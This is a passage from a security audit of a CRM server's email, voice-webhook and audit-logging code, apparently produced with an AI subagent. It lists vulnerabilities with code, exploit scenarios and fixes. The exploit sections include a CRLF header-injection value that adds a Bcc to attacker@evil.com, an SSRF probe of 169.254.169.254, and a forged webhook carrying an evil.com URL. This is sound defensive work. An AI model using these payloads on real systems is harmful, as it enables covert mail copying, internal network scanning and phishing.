- **`delivery_email` CRLF in `to` field:** The `to` field is not CRLF-sanitized by our code, but nodemailer's addressparser handles this. The `.includes('@')` check is weak but insufficient to enable header injection given nodemailer's protections.


---

# T15-smtp-relay

# T15 — SMTP Relay Abuse, From-Domain Spoofing, Provider Impersonation

**Auditor slot:** T15  
**Files examined:** `services/email.ts`, `routes/settings.routes.ts`, `routes/notifications.routes.ts`, `routes/campaigns.routes.ts`, `routes/reports.routes.ts`, `routes/automations.routes.ts`, `services/automations.ts`, `services/dunningScheduler.ts`, `services/reportEmailer.ts`, `services/scheduledReports.ts`, `services/sampleData.ts`, `routes/onboarding.routes.ts`, `routes/signup.routes.ts`, `utils/configEncryption.ts`, `utils/ssrfGuard.ts`, migrations `012_notification_templates.sql`, `090_reports_bi_enhancements.sql`

---

### MEDIUM No domain-ownership check on `from_email` / `smtp_from` — any tenant can set `from: victim@competitor.com`

**Where:** `packages/server/src/services/email.ts:67–112` and `packages/server/src/routes/settings.routes.ts:439–480`

**What:**
The `from_email` / `smtp_from` fields stored in `store_config` are the outbound SMTP `From:` address for all tenant email (receipts, dunning, campaigns, auto-notifications). The only validation applied is `EMAIL_FROM_RE` — a loose regex that checks for `@` and a dot. There is no check that the domain in `from_email` matches (or is owned by) the tenant's SMTP `smtp_user` domain or any verified domain. A tenant who configures SMTP credentials for their own relay (e.g. `smtp.mailgun.org` with their API key) and then sets `from_email: noreply@apple.com` will send all outbound emails with `From: noreply@apple.com` through their relay. Whether the message survives SPF/DKIM/DMARC depends entirely on the relay's policies — many relays (Mailgun "flex" domains, SendGrid, SES relay-mode) do NOT enforce that the envelope `From` domain is one the account has verified. The server never performs a DNS check on the sender domain nor does it compare the `from_email` domain against the `smtp_user` / `smtp_host`.

**Code:**
```typescript
// services/email.ts:67-112 (getSmtpConfig)
const fromEmailRaw = get('from_email').trim();
// EMAIL_FROM_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/  — format only, no domain-ownership check
if (fromEmailRaw && EMAIL_FROM_RE.test(fromEmailRaw)) {
  from = fromEmailRaw;  // set to ANY email address the tenant stored
  fromSource = 'from_email';
} else if (smtpFrom) {
  from = smtpFrom;  // or smtp_from — also unchecked for domain ownership
```

**Exploit:**
Admin of tenant "badactor" configures their own Mailgun relay (which passes SPF for `mailgun.org`), sets `from_email = noreply@bizarrecrm.com` (or any victim domain), then triggers a bulk campaign or dunning send. Thousands of customers receive email appearing to originate from `noreply@bizarrecrm.com` (or `support@apple.com`, etc.), bypassing DMARC if the relay's signing domain doesn't align with the From domain. This enables phishing at scale attributed to the victim domain.

**Fix:**
At the time `from_email` is stored via `PUT /config`, validate that the `from_email` domain exactly matches the `smtp_user` domain (or is an explicit allowlist maintained by super-admin per tenant). For SaaS relay providers (Mailgun, SendGrid, SES) that support verified-sender lists, reject any `from_email` whose domain isn't verified in that account. At minimum, add a server-side warning/block when the `from_email` domain differs from the `smtp_user` domain.

---

### MEDIUM No rate limit on `POST /settings/email/test-smtp` — SSRF probe + connection-spam vector

**Where:** `packages/server/src/routes/settings.routes.ts:1877–1905`

**What:**
The `POST /settings/email/test-smtp` endpoint accepts an arbitrary `host` and `port` in the request body, opens a nodemailer transporter to that host, calls `.verify()` (which initiates a full SMTP handshake), and returns the banner / error. There is no rate limit on this endpoint and no SSRF guard — `assertPublicUrl` / `ssrfGuard.ts` is never called. An admin can supply `host: 169.254.169.254`, `host: 10.0.0.1`, or any internal hostname and receive the SMTP banner (or a TCP-connect error whose message often reveals whether a port is open), amounting to a credentialed internal network port-scanner. Likewise, there is no per-admin rate limit, so a script can hammer this endpoint to exhaust TCP connection slots or trigger connection-limit bans on external SMTP servers.

**Code:**
```typescript
// settings.routes.ts:1877-1897
router.post('/email/test-smtp', adminOnly, async (req, res, next) => {
  const { host, port, user, pass } = req.body;
  if (!host) throw new AppError('smtp_host is required', 400);
  const portNum = port ? parseInt(String(port), 10) : 587;
  // No SSRF guard, no private-IP block, no rate limit
  const transport = nodemailer.createTransport({
    host: String(host).trim(),   // ← any IP/hostname accepted
    port: portNum,
    ...
  });
  await transport.verify();      // ← initiates TCP + SMTP handshake to supplied host
  transport.close();
```

**Exploit:**
A compromised admin account (or a legitimate admin on a free-tier plan) calls `POST /settings/email/test-smtp` with `{"host":"169.254.169.254","port":25}` and reads the banner to confirm cloud IMDS reachability, then probes RFC-1918 space systematically. Even without credentials, banner grabbing on ports 25/465/587 across the internal network reveals service topology. No account lockout or rate limit protects against automated scanning.

**Fix:**
Apply the existing `ssrfGuard.ts` `assertPublicUrl` logic (adapted for raw hostnames rather than URLs) before creating the nodemailer transport. Also add a per-admin rate limit (e.g. 5 requests per minute) via `checkWindowRate`. Note: the SMS `test-send` and `test-connection` endpoints (lines 1704 and 1838) similarly lack rate limits and should receive the same treatment.

---

### MEDIUM No rate limit on `POST /notifications/send-receipt` (email path) — unlimited authenticated relay abuse

**Where:** `packages/server/src/routes/notifications.routes.ts:205–357`

**What:**
`POST /notifications/send-receipt` sends a full HTML receipt email via the tenant's SMTP to the invoice's customer address. It enforces manager-or-admin role and verifies `recipient_email === invoice.customer_email` (SCAN-811), but there is no per-user or per-tenant rate limit on the email dispatch path. The parallel SMS receipt endpoint (`/send-receipt-sms`) explicitly enforces 30/min per user at line 375. The email path was never given equivalent protection. An admin/manager can iterate over all invoice IDs in a loop and re-send receipts at full request throughput — potentially thousands of emails per minute — burning SMTP quota, triggering domain reputation damage, or harassing individual customers.

**Code:**
```typescript
// notifications.routes.ts:207-357  (send-receipt email path)
router.post('/send-receipt', asyncHandler(async (req, res) => {
  requireManagerOrAdmin(req);
  // ... invoice lookup + SCAN-811 customer-match check ...
  // No rate limit — compare to /send-receipt-sms at line 375:
  //   if (!checkWindowRate(db, 'receipt_sms', String(userId), 30, 60_000)) {
  //     throw new AppError('Rate limit exceeded. Try again shortly.', 429);
```

**Exploit:**
Manager calls `POST /notifications/send-receipt` in a tight loop over all invoice IDs. The server forwards each to the SMTP relay with no throttle. 10,000 emails per minute is plausible over a fast LAN, enough to exhaust a Mailgun/SendGrid free-tier daily limit in seconds, or to flood a customer's inbox with repeated receipts (harassment / spam complaint vector that gets the tenant's sending domain/IP blacklisted).

**Fix:**
Add `checkWindowRate(db, 'receipt_email', String(userId), 30, 60_000)` immediately after `requireManagerOrAdmin(req)` at line 210, matching the SMS path at line 375. Consider a per-invoice-id idempotency guard (e.g. a cooldown of 5 minutes before the same invoice can be re-sent) as defense-in-depth.

---

### MEDIUM `PUT /store` saves `smtp_from` without email-format validation — SMTP header injection bypass

**Where:** `packages/server/src/routes/settings.routes.ts:570–598`

**What:**
There are two endpoints that persist SMTP config: `PUT /config` (line 482) runs `validateConfigValue()` which calls `EMAIL_RE.test()` on `smtp_from` because it is in `EMAIL_SETTINGS`, and rejects malformed values. `PUT /store` (line 570) has its own hardcoded `allowed` list that includes `smtp_from` but skips `validateConfigValue` entirely — it writes the raw string directly to `store_config`. An admin can therefore store a header-injection payload (`smtp_from: "legit\r\nBcc: victim@example.com"`) via `PUT /store`, which then flows into `getSmtpConfig()` at `email.ts:76–90` and becomes the nodemailer `from:` field. `sanitizeSubject` in `email.ts:157–159` strips `\r\n` from the subject, but the `from` address is never sanitized.

**Code:**
```typescript
// settings.routes.ts:578-583 — PUT /store, smtp_from accepted with no validation
const allowed = ['store_name','address','phone','email','timezone','currency','tax_rate',
  'receipt_header','receipt_footer','logo_url','sms_provider','tcx_host','tcx_extension',
  'tcx_password','smtp_host','smtp_port','smtp_user','smtp_from','business_hours','store_logo'];
for (const [key, value] of Object.entries(req.body)) {
  if (!allowed.includes(key)) continue;
  await adb.run('INSERT OR REPLACE INTO store_config (key, value) VALUES (?, ?)', key, strVal);
  // ↑ no validateConfigValue call — smtp_from with CRLF is stored as-is
```

**Exploit:**
Admin sets `smtp_from` to `noreply@shop.com\r\nBcc: attacker@evil.com` via `PUT /store`. On next email dispatch (receipt, campaign, dunning), nodemailer injects the `Bcc` header into every outbound message, silently copying attacker. Additionally, a crafted `smtp_from` containing `\r\nSubject: override` can replace the email subject.

**Fix:**
Apply `validateConfigValue` in `PUT /store` for all keys that are also in `ALLOWED_CONFIG_KEYS` and `EMAIL_SETTINGS`. The simplest fix is to replace the inline allowlist-loop in `PUT /store` with a call to the same `validateConfigValue` guard used in `PUT /config`, or at minimum add `EMAIL_RE.test(value)` for `smtp_from` / `smtp_user` / `store_email` before the `adb.run` insert.

---

### INFO No server-side DKIM/SPF/DMARC alignment check before sending

**Where:** `packages/server/src/services/email.ts` (entire file)

**What:**
The server never performs a DNS lookup to verify SPF/DKIM/DMARC alignment between the configured `from_email` domain and the `smtp_host` before accepting SMTP credentials. This is expected of a CRM relay (SPF/DKIM are configured at the DNS/relay layer, not the application layer), but combined with finding 1 (no domain-ownership check) the absence of any server-side DNS verification means the application provides no warning when a tenant's `from_email` domain will fail DMARC alignment. A future hardening option would be to perform a permissive SPF TXT lookup on the `from_email` domain and warn (not block) if the configured `smtp_host` is not in the SPF record.

**Fix:**
Informational — no urgent code change. Consider adding a background verification step (async, non-blocking) that queries SPF/DMARC DNS records on the `from_email` domain when SMTP credentials are saved and logs a warning if the `smtp_host` IP is outside the declared SPF policy. This surfaces misconfiguration before production sends fail with bounces.

---

### INFO Sample-data customers use `@example.com` addresses — safe, no real email risk

**Where:** `packages/server/src/services/sampleData.ts:84–88`

**What:**
The five hardcoded sample customers (`alex.demo@example.com`, `jamie.sample@example.com`, etc.) all use the IANA-reserved `example.com` domain, which does not accept email. If `send_email_auto` or a campaign fires against sample data before the tenant deletes it, the messages are guaranteed to bounce rather than reach real inboxes. No real-person address is hardcoded in sample data.

**Fix:**
No action required. Observation for completeness.

---

## Summary

| Sev | Count |
|-----|-------|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 4 |
| LOW | 0 |
| INFO | 2 |

**Most impactful finding:** T15 MEDIUM #1 — tenants can set `from_email` to any arbitrary domain with no ownership verification, enabling From-address spoofing through their own SMTP relay to impersonate Bizarre CRM or competitor brands in bulk mail.


---

# T16-voice-ivr

# T16 — Voice / IVR / TwiML / Webhook Security

**Scope:** `packages/server/src/routes/voice.routes.ts`, `packages/server/src/providers/sms/twilio.ts`, `packages/server/src/providers/sms/telnyx.ts`, `packages/server/src/providers/sms/plivo.ts`, `packages/server/src/providers/sms/bandwidth.ts`, `packages/server/src/providers/sms/vonage.ts`, `packages/server/src/providers/sms/console.ts`, `packages/server/src/services/smsProvider.ts` (index), `packages/server/src/index.ts` (mounting), `packages/server/src/db/migrations/043_sms_mms_voice.sql`

> **Note:** Two findings already documented in S35 are intentionally excluded here to avoid duplication:
> - HIGH — `voiceInstructionsHandler` has no webhook signature verification (S35, line 7)
> - MEDIUM — `voiceInstructionsHandler` accepts arbitrary `?to=` phone number (S35, line 88)

---

### HIGH — IDOR: entity_type+entity_id bypass exposes all calls, recordings, and transcriptions to any authenticated user

**Where:** `packages/server/src/routes/voice.routes.ts:183–214`

**What:**
`GET /api/v1/voice/calls` applies the non-admin restriction (`cl.user_id = ? OR cl.direction = 'inbound'`) only when `entityType && entityId` are both absent. When a caller supplies any `entity_type` + `entity_id` query parameter pair, the restriction is dropped entirely — no check verifies whether the requesting user has access to that entity. Any authenticated user (technician, receptionist) can enumerate call logs, recording URLs, and transcriptions for any entity by cycling through `entity_id` values.

**Code:**
```typescript
// voice.routes.ts:183–201
const entityType = req.query.entity_type as string | undefined;
const entityId = req.query.entity_id as string | undefined;

if (convPhone) { where += ' AND cl.conv_phone = ?'; params.push(convPhone); }
if (entityType && entityId) {
  where += ' AND cl.entity_type = ? AND cl.entity_id = ?';
  params.push(entityType, parseInt(entityId, 10));
}

const isAdmin = req.user!.role === 'admin' || req.user!.role === 'manager';
if (!isAdmin && !(entityType && entityId)) {   // <— bypass: condition is FALSE when entity provided
  where += ' AND (cl.user_id = ? OR cl.direction = ?)';
  params.push(req.user!.id, 'inbound');
}
```

**Exploit:**
A technician-role user sends `GET /api/v1/voice/calls?entity_type=ticket&entity_id=1` to retrieve all call logs for ticket 1, including `from_number`, `to_number`, `recording_url`, `recording_local_path`, and `transcription` of calls made by other employees. Cycling `entity_id` from 1 upward dumps the full call history with no per-record authz check.

**Fix:**
Before removing the user-scope restriction, verify the requesting user has read access to the specified entity (e.g., confirm the ticket/customer belongs to their tenant and they have at minimum `viewer` access). Alternatively, keep the restrictive filter and add an OR clause: `AND (cl.entity_type = ? AND cl.entity_id = ? AND <entity_read_check>)`.

---

### MEDIUM — Any authenticated non-admin user can read ALL inbound call logs and recordings

**Where:** `packages/server/src/routes/voice.routes.ts:197–201` (list), `voice.routes.ts:239`, `voice.routes.ts:332`, `voice.routes.ts:364`

**What:**
Without an entity scope, the non-admin WHERE clause adds `OR cl.direction = 'inbound'`, which reveals every inbound call—regardless of which user the call is associated with—to any authenticated user. The same condition appears on single-call detail (`GET /calls/:id`), recording URL issuance (`GET /calls/:id/recording-url`), and the streaming endpoint (`GET /calls/:id/recording`). Inbound calls contain customer phone numbers, transcriptions (which may include CC numbers spoken aloud, PII, complaints), and recording audio.

**Code:**
```typescript
// voice.routes.ts:197–200
const isAdmin = req.user!.role === 'admin' || req.user!.role === 'manager';
if (!isAdmin && !(entityType && entityId)) {
  where += ' AND (cl.user_id = ? OR cl.direction = ?)';
  params.push(req.user!.id, 'inbound');  // exposes ALL inbound calls
}
// Single call detail:
if (!isAdmin && call.user_id !== req.user!.id && call.direction !== 'inbound') {
  throw new AppError('Not authorized', 403); // inbound calls always pass
}
```

**Exploit:**
A new technician with no calls of their own sends `GET /api/v1/voice/calls` and receives the entire inbound call history for the shop, including transcriptions and recording URLs for every customer call. They can then fetch any recording via `GET /calls/:id/recording-url` (which issues a signed URL without a further user-scope check for inbound calls).

**Fix:**
Inbound calls that have no `user_id` association should be viewable only by admin/manager. Non-admin users should see only inbound calls associated with their `user_id` (e.g., calls they answered or that reference an entity they can access). Replace the OR with: `AND (cl.user_id = ? OR (cl.direction = 'inbound' AND cl.user_id IS NULL))` or add a proper entity-based access check.

---

### MEDIUM — POST /call accepts any phone number — any authenticated user can initiate toll-fraud calls

**Where:** `packages/server/src/routes/voice.routes.ts:76–167`

**What:**
`POST /api/v1/voice/call` checks only that `to` is non-empty (line 83) and then passes it directly to `provider.initiateCall()`. There is no E.164 format validation, no geo-block, and no restriction on premium-rate number ranges (`+1900…`, `+44XXX…`, etc.). Because this route is protected by auth (any role) and limited to 10 calls/min per user — not per IP or globally — each of the shop's technicians can individually initiate calls to billing traps at the provider's per-minute rate, charged to the tenant's account.

**Code:**
```typescript
// voice.routes.ts:79–90
const { to, mode, entity_type, entity_id } = req.body as {
  to?: string; mode?: 'bridge' | 'push'; entity_type?: string; entity_id?: number;
};
if (!to) throw new AppError('Recipient phone number is required', 400);
// SCAN-719: rate limit — 10/min per user, not per shop or globally
if (!checkWindowRate(req.db, 'voice_call', String(userId), 10, 60_000)) {
  throw new AppError('Too many call attempts — try again later', 429);
}
recordWindowAttempt(req.db, 'voice_call', String(userId), 60_000);
// `to` passed verbatim to provider.initiateCall(to, storePhone, opts)
```

**Exploit:**
A low-privilege technician (`role=tech`) authenticates, then POSTs `{ "to": "+19001234567" }` — a US pay-per-call premium number — 10 times per minute. With 5 technicians on staff, the shop is billed for 50 premium calls/minute until the provider cuts off the account. Because `to_number` is logged in `call_logs` without PII scrubbing in the rate-limit key, different users with the same `to` number are not jointly rate-limited.

**Fix:**
Validate `to` against an E.164 regex at minimum (`/^\+[1-9]\d{7,14}$/`). Consider an admin-configurable geo-allow/block list. Add a per-shop global rate limit (not per-user) to cap total outbound call spend. Flag premium-rate prefixes (`+1900`, `+1976`, `+44909`, etc.) as blocked by default.

---

### MEDIUM — TOCTOU race in POST /call rate limiter allows burst past the 10/min cap

**Where:** `packages/server/src/routes/voice.routes.ts:87–90`

**What:**
The rate check uses the deprecated two-step pattern `checkWindowRate(…)` + `recordWindowAttempt(…)` instead of the atomic `consumeWindowRate(…)`. Both functions are separate SQLite statements and are not wrapped in a transaction. Two concurrent `POST /call` requests from the same user can both see `count = 9`, both pass `checkWindowRate`, and both record, submitting 2 provider calls instead of 1. SCAN-1065 (documented in `rateLimiter.ts` line 53) flagged this exact pattern for migration; `voice_call` was not on the priority list in S28's audit.

**Code:**
```typescript
// voice.routes.ts:87–90
if (!checkWindowRate(req.db, 'voice_call', String(userId), 10, 60_000)) {
  throw new AppError('Too many call attempts — try again later', 429);
}
recordWindowAttempt(req.db, 'voice_call', String(userId), 60_000);
// Two concurrent requests both pass checkWindowRate before either records
```

**Exploit:**
An attacker opens two browser tabs and fires `POST /call` simultaneously from both. Both see count=9, both pass, both initiate provider calls, resulting in 11+ calls in the window instead of 10. Under automation (JS `Promise.all`), a user can place significantly more than 10 calls per minute against the provider.

**Fix:**
Replace with `consumeWindowRate(req.db, 'voice_call', String(userId), 10, 60_000)` (single atomic check-and-record transaction). This matches the pattern used by `webhookRateLimit` and the global API limiter.

---

### MEDIUM — voiceStatusWebhookHandler stores unvalidated recordingUrl directly into call_logs

**Where:** `packages/server/src/routes/voice.routes.ts:476–477`

**What:**
`voiceStatusWebhookHandler` parses `event.recordingUrl` from the webhook payload and writes it to `call_logs.recording_url` without passing it through `validateRecordingUrl()`. The recording webhook handler (`voiceRecordingWebhookHandler`) correctly calls `validateRecordingUrl(downloadUrl)` before downloading, but the status webhook bypasses this check and persists the raw URL. If an attacker forges a status webhook (possible when webhook signature verification is not implemented or misconfigured), they can inject an arbitrary URL — including non-provider domains or data URIs — into the `recording_url` column. This URL is returned in `cl.*` API responses and exposed in the UI as the recording URL.

**Code:**
```typescript
// voice.routes.ts:472–480
const updates: string[] = ['status = ?', "updated_at = datetime('now')"];
const params: any[] = [event.status];

if (event.duration != null) { updates.push('duration_secs = ?'); params.push(event.duration); }
if (event.recordingUrl) { updates.push('recording_url = ?'); params.push(event.recordingUrl); }
// No validateRecordingUrl() call here — raw URL stored directly
params.push(call.id);
await adb.run(`UPDATE call_logs SET ${updates.join(', ')} WHERE id = ?`, ...params);
```

**Exploit:**
An attacker forges a Twilio status webhook (e.g., exploiting the SHA-1 HMAC weakness noted in T08, or by replaying a captured webhook, or using ConsoleProvider in a dev deployment). They include `RecordingUrl: "https://evil.com/phishing-audio.mp3"` in the payload. The URL is stored in `call_logs.recording_url` and returned in `GET /voice/calls/:id` responses. UI components that render it as a clickable link present it to shop staff as a legitimate recording. The actual redirect through `/recording/:id` is blocked by `validateRecordingUrl`, but the raw URL appearing in the API response is sufficient for phishing.

**Fix:**
Call `validateRecordingUrl(event.recordingUrl)` before adding it to the update array. Wrap in a try/catch (same as `voiceRecordingWebhookHandler`) and skip the update if validation fails, logging a warning.

---

### LOW — No length limit on transcription field stored from webhook

**Where:** `packages/server/src/routes/voice.routes.ts:678–683`, `packages/server/src/db/migrations/043_sms_mms_voice.sql:28`

**What:**
`voiceTranscriptionWebhookHandler` stores `req.body.TranscriptionText` (or equivalent) directly into `call_logs.transcription` (a TEXT column with no CHECK constraint or length limit). There is no server-side truncation or size guard. A forged webhook (feasible with ConsoleProvider, a replay attack, or an upstream provider compromise) can store megabytes of text per call, filling disk and degrading SQLite performance for all queries on `call_logs`.

**Code:**
```typescript
// voice.routes.ts:678–683
if (call && transcription) {
  await adb.run(`
    UPDATE call_logs SET transcription = ?, transcription_status = 'completed', ...
    WHERE id = ?
  `, transcription, call.id);
}
// `transcription` is req.body.TranscriptionText — unbounded length
```

**Exploit:**
An attacker targeting a ConsoleProvider-configured dev server (or exploiting Plivo's nonce-only replay protection gap noted in T11) POSTs a fabricated transcription webhook with a 50 MB `TranscriptionText` body. SQLite stores it; the next `SELECT * FROM call_logs` that scans the table transmits 50 MB per row, degrading all call log queries.

**Fix:**
Truncate `transcription` to a reasonable maximum (e.g., 64 KB) before storing: `transcription.slice(0, 65536)`. Add a similar limit check in the `voiceRecordingWebhookHandler` transcription trigger path. Consider adding a CHECK constraint on the column.

---

### LOW — Transcription callback URL uses LAN IP in production — transcriptions never delivered

**Where:** `packages/server/src/routes/voice.routes.ts:627–629`

**What:**
When `voice_auto_transcribe` is enabled and a recording is downloaded, the transcription callback URL sent to the provider is constructed using `getLanIp()` (a private network address) in all environments, not just dev. The POST `/call` endpoint correctly uses `req.get('host')` in production but the recording webhook handler does not. The result: Twilio (or other providers) cannot reach the transcription webhook URL from the internet, so `transcription_status` stays `'pending'` forever and transcriptions are silently dropped.

**Code:**
```typescript
// voice.routes.ts:627–630
const lanIp = getLanIp();
const protocol = config.nodeEnv === 'production' ? 'https' : (req.protocol || 'https');
const callbackUrl = `${protocol}://${lanIp}:${config.port}/api/v1/voice/transcription-webhook`;
await provider.requestTranscription(recordingId, callbackUrl);
// Contrast with POST /call (line 130–132):
// const callbackBaseUrl = config.nodeEnv === 'production'
//   ? `https://${req.get('host')}`       ← correct
//   : `https://${lanIp}:${config.port}`;
```

**Exploit:**
Not a security exploit, but the inconsistency can be intentionally abused: a tenant enables `voice_auto_transcribe` expecting a security audit trail (compliance requirement), which silently produces no transcriptions. The functional gap also means `transcription_status = 'pending'` rows accumulate indefinitely with no cleanup path.

**Fix:**
Use the same `callbackBaseUrl` pattern as `initiateCall`: in production use `https://${req.get('host')}`, in dev use `https://${lanIp}:${config.port}`. Pass `callbackBaseUrl` or derive it in `voiceRecordingWebhookHandler` from the incoming request the same way the POST /call handler does.

---

### INFO — Multi-tenant path-based routing missing recording and transcription webhook routes

**Where:** `packages/server/src/index.ts:1590–1591`

**What:**
In multi-tenant mode, the path-based webhook routes (`/api/v1/t/:slug/…`) include `inbound-webhook` and `status-webhook` but not `recording-webhook` or `transcription-webhook`. If a provider is configured to use path-based tenant routing (instead of subdomain-based routing), recording downloads and transcriptions will be silently dropped for those tenants.

**Code:**
```typescript
// index.ts:1590–1591 — only two of four voice webhook routes mounted for t/:slug
app.post('/api/v1/t/:slug/voice/inbound-webhook', webhookRateLimit, webhookTenantResolver, voiceInboundWebhookHandler);
app.post('/api/v1/t/:slug/voice/status-webhook', webhookRateLimit, webhookTenantResolver, voiceStatusWebhookHandler);
// Missing:
// app.post('/api/v1/t/:slug/voice/recording-webhook', ...)
// app.post('/api/v1/t/:slug/voice/transcription-webhook', ...)
```

**Exploit:**
Functional gap, not a direct security exploit. However, missing recordings means compliance/audit requirements fail silently without any error surfaced to the tenant.

**Fix:**
Add `recording-webhook` and `transcription-webhook` to the multi-tenant slug routing block, mirroring the pattern for the existing two routes.

---


---

# T17-audit-completeness

# T17 — Audit Log Completeness Matrix

**Slot:** T17  
**Audited by:** Claude Sonnet 4.6 (subagent)  
**Date:** 2026-05-06  
**Files covered:** `packages/server/src/utils/audit.ts`, `utils/masterAudit.ts`, `routes/auth.routes.ts`, `routes/settings.routes.ts`, `routes/roles.routes.ts`, `routes/employees.routes.ts`, `routes/admin.routes.ts`, `routes/super-admin.routes.ts`, `routes/super-admin-management.routes.ts`, `routes/management.routes.ts`, `routes/refunds.routes.ts`, `routes/invoices.routes.ts`, `routes/creditNotes.routes.ts`, `routes/giftCards.routes.ts`, `routes/customers.routes.ts`, `routes/dataExport.routes.ts`, `routes/pos.routes.ts`, `middleware/auth.ts`, `db/master-connection.ts`, `db/migrations/022_audit_logs.sql`, `index.ts`

---

## Coverage Matrix

| Operation | Audited | Event Name | Notes |
|-----------|---------|------------|-------|
| Login success | ✅ | `login_success` | auth.routes.ts:853,1068 |
| Login failure | ✅ | `login_failed` | auth.routes.ts:761,806 |
| Logout | ❌ | — | POST /logout at 1418 deletes session, sets cookies, returns — no audit call |
| Password reset request | ✅ | `password_reset_requested` | auth.routes.ts:1707,1730 |
| Password reset complete | ✅ | `password_reset_completed` | auth.routes.ts:1888 |
| Password change (self) | ✅ | `password_changed` | auth.routes.ts:2314 |
| Password change (admin) | ✅ | `password_changed_by_admin` | settings.routes.ts:1205 |
| Email change (user) | ❌ | — | settings.routes.ts:1192–1200 UPDATE includes `email = COALESCE(?, email)`, no `email_changed` audit call |
| 2FA enroll (first verify) | ⚠️ | `login_success` (method=2fa_setup) | Enrollment is logged but as a login event, not a dedicated `2fa_enrolled` event |
| 2FA disable (self) | ✅ | `2fa_disabled` | auth.routes.ts:1981 |
| 2FA disable (admin) | ✅ | `2fa_force_disabled` | auth.routes.ts:2030 |
| 2FA recovery code use | ✅ | `backup_code_recovery_success` | auth.routes.ts:2185 |
| Trust device add | ⚠️ | `login_success` (method=2fa_trusted_device) | Implicit; no dedicated `device_trust_added` event |
| Role grant/revoke | ✅ | `user_role_changed` | settings.routes.ts:1211; roles.routes.ts:329 |
| Employee disable | ❌ | — | settings.routes.ts:1228–1230 revokes sessions but no `user_disabled` audit row |
| Employee hard-delete | N/A | — | No DELETE FROM users route found; only is_active=0 |
| Settings PUT (all keys) | ✅ | `setting_changed` | settings.routes.ts:526 (before/after with masking for sensitive keys) |
| Data export request | ✅ | `data_export` | dataExport.routes.ts:191 |
| Data export download | ✅ | `data_export` (combined) | Same event; request+stream combined |
| Tenant create | ✅ | `tenant_created` | super-admin.routes.ts:741 |
| Tenant repair | ✅ | `tenant_repaired` | super-admin.routes.ts:1134 |
| Tenant suspend/terminate | ✅ | `tenant_suspended`, `tenant_deleted` | super-admin.routes.ts:1118,1179 |
| Impersonate start | ✅ | `super_admin.impersonate_started` | Both master + tenant audit; 2665,2677 |
| Impersonate end | ✅ | `super_admin.impersonate_ended` | super-admin.routes.ts:2773,2783 |
| JWT rotate | ✅ | `super_admin_rotate_jwt_secret` | super-admin.routes.ts:604 |
| Refund issued | ✅ | `refund_created` | refunds.routes.ts:236 |
| Void | ✅ | `invoice_voided` | invoices.routes.ts:952 |
| Credit note created | ✅ | `credit_note.created` | creditNotes.routes.ts:221; invoices.routes.ts:1305 |
| Gift card load | ✅ | `gift_card_issued` | giftCards.routes.ts:312 |
| Gift card redeem | ✅ | `gift_card_redeemed` | giftCards.routes.ts:385 |
| Customer hard-delete / GDPR erase | ✅ | `customer_gdpr_erased` | customers.routes.ts:2244 |
| Audit log read | ❌ | — | GET /settings/audit-logs (settings.routes.ts:1913) has no meta-audit insert |
| Backup create (admin) | ❌ | — | POST /admin/backup (admin.routes.ts:454) calls runBackup() with no audit call |
| Backup restore | ✅ | `admin_backup_restore_start/success/failed` | admin.routes.ts:537,580,599 |
| Backup download | ✅ | `admin_backup_download` | admin.routes.ts:483 |
| Super-admin backup create | ✅ | `super_admin_tenant_backup_run` | super-admin.routes.ts:1436 |

---

## Findings

### MEDIUM — Logout not audited: session termination leaves no trail

**Where:** `packages/server/src/routes/auth.routes.ts:1418`

**What:**
The POST `/logout` route deletes the session row from the DB and clears the `refreshToken`, `csrf_token`, and `deviceTrust` cookies, then returns `{success: true}`. There is no call to `audit()` or `logTenantAuthEvent()`. Every other auth transition (login, refresh, 2FA, pin-switch) writes an audit row, but logout is entirely invisible in the audit trail. In an incident investigation it is impossible to determine from the audit log whether a user proactively logged out or was terminated by session expiry/revocation.

**Code:**
```typescript
router.post('/logout', authMiddleware, asyncHandler(async (req: Request, res: Response) => {
  const adb = req.asyncDb;
  await adb.run('DELETE FROM sessions WHERE id = ?', req.user!.sessionId);
  res.clearCookie('refreshToken', { path: '/' });
  res.clearCookie('csrf_token', { path: '/' });
  res.clearCookie('deviceTrust', { path: '/' });
  res.json({ success: true, data: { message: 'Logged out' } });
  // ← no audit() or logTenantAuthEvent() call
}));
```

**Exploit:**
An insider threat or compromised account logs out after exfiltrating data. The audit trail shows the data access events but no termination event, making it harder to construct a timeline and confirm the session was explicitly ended rather than stolen.

**Fix:**
Add `audit(req.db, 'logout', req.user!.id, req.ip || 'unknown', { sessionId: req.user!.sessionId })` and `logTenantAuthEvent('logout', req, req.user!.id, req.user!.username)` immediately before the `res.json()` call, mirroring the pattern used at `login_success`.

---

### MEDIUM — User disable (is_active=0) not audited

**Where:** `packages/server/src/routes/settings.routes.ts:1228`

**What:**
The `PUT /settings/users/:id` endpoint handles password change (`password_changed_by_admin`), role change (`user_role_changed`), and PIN change (`pin_changed_by_admin`) — each with a dedicated audit call. However, setting `is_active = 0` (disabling a user account) only triggers `DELETE FROM sessions` but writes no audit row. An admin can silently lock out a user and there is no recoverable audit trail of the deactivation event, actor, or timestamp.

**Code:**
```typescript
if (pin) {
  audit(db, 'pin_changed_by_admin', req.user!.id, req.ip || 'unknown', { target_user_id: targetUserId });
}
// If user was deactivated, invalidate all their sessions
if (is_active === 0 || is_active === false) {
  await adb.run('DELETE FROM sessions WHERE user_id = ?', req.params.id);
  // ← no audit call here
}
```

**Exploit:**
A rogue admin disables a whistleblower's or auditor's account. No audit row is written; the only evidence is the `is_active` column value and the `updated_at` timestamp, neither of which records who performed the action.

**Fix:**
Add `audit(db, 'user_disabled', req.user!.id, req.ip || 'unknown', { target_user_id: targetUserId, previous_role: targetBefore.role })` inside the `if (is_active === 0 || is_active === false)` block. Similarly add `user_reactivated` when transitioning to `is_active = 1`.

---

### MEDIUM — Email change not audited

**Where:** `packages/server/src/routes/settings.routes.ts:1192`

**What:**
The `PUT /settings/users/:id` handler issues a single `UPDATE users SET email = COALESCE(?, email), ...` that can change a user's email address (an account-takeover vector). Auditing fires only for password, role, or PIN changes — not for email mutations. A changed email redirects future password-reset links, making this one of the highest-value account mutations.

**Code:**
```typescript
await adb.run(`
  UPDATE users SET
    email = COALESCE(?, email), first_name = COALESCE(?, first_name),
    ...
  WHERE id = ?
`, email ?? null, ...);

if (password) {
  audit(db, 'password_changed_by_admin', req.user!.id, req.ip || 'unknown', { target_user_id: targetUserId });
}
// ← no audit for email change
```

**Exploit:**
An admin or compromised admin session silently changes a target user's login email to an attacker-controlled address, then requests a password reset to take over the account. No audit event is written; the only forensic evidence is the `updated_at` column.

**Fix:**
